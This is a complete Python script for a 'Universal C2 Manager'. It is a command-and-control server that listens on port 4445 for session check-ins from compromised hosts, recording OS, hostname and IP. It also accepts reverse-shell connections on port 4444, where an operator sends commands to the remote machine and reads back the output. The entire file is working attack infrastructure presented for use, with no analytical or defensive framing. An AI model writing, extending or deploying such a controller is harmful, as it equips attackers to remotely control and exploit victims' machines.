#!/usr/bin/env python3
import socket
import threading
import time
from datetime import datetime

class C2Manager:
    def __init__(self, lhost="0.0.0.0", shell_port=4444, notify_port=4445):
        self.lhost = lhost
        self.shell_port = shell_port
        self.notify_port = notify_port
        self.sessions = {}
        self.session_counter = 0

    def handle_notifications(self):
        s = socket.socket()
        s.bind((self.lhost, self.notify_port))
        s.listen(5)
        print(f"[+] Notification listener: :{self.notify_port}")

        while True:
            client, addr = s.accept()
            try:
                data = client.recv(1024).decode()
                if data.startswith("NEW_SESSION:"):
                    _, sess_id, os_type, hostname, status = data.split(":", 4)
                    self.sessions[sess_id] = {
                        'os': os_type, 'host': hostname, 'status': status,
                        'ip': addr[0], 'time': datetime.now().strftime("%H:%M:%S")
                    }
                    print(f"🌟 NEW SESSION [{self.session_counter+1}]: {sess_id} ({os_type}/{hostname}) - {status}")
                    self.session_counter += 1
            except: pass
            client.close()

    def handle_shell(self):
        s = socket.socket()
        s.bind((self.lhost, self.shell_port))
        s.listen(5)
        print(f"[+] Shell listener: :{self.shell_port}")
        print("Sessions:", list(self.sessions.keys()) or "None")

        while True:
            client, addr = s.accept()
            sess_name = f"{addr[0]}:{addr[1]}"
            print(f"\n🐚 SESSION OPEN: {sess_name}")

            while True:
                cmd = input(f"{sess_name}> ")
                if cmd.lower() in ['sessions', 'list']:
                    print("Active:", list(self.sessions.keys()))
                    continue
                if cmd.lower() in ['exit', 'quit']:
                    break

                try:
                    client.send(cmd.encode())
                    response = client.recv(4096).decode('utf-8', errors='ignore')
                    print(response, end='')
                except:
                    break
            client.close()
            print(f"❌ {sess_name} closed")

    def run(self):
        print("🚀 Universal C2 Manager Started")
        print(f"Shell:  :{self.shell_port} | Notify: :{self.notify_port}")
        print("Commands: sessions, list, exit")

        notify_thread = threading.Thread(target=self.handle_notifications, daemon=True)
        notify_thread.start()

        self.handle_shell()

if __name__ == "__main__":
    C2Manager().run()
